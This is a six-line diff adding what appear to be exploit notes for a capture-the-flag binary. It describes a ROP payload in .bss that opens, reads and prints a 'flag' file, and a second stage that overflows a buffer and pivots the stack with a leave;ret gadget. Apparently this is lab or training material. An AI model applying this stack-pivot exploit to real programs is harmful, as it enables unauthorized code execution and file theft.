@@ -1,0 +1,6 @@
+stage1 @ .bss 0x4b3ac0 (0x300 bytes)
+  [0x000] bss dummy rbp
+  open("flag"@bss+0x180, 0)            rax=2
+  read(3, bss+0x200, 0x100)             rax=0, rdx 由 xchg rax,rdx 设置
+  write(1, bss+0x200, 0x100)            rax=1
+stage2 = 0x40*A + p64(0x4b3ac0) + p64(leave;ret=0x40198d)
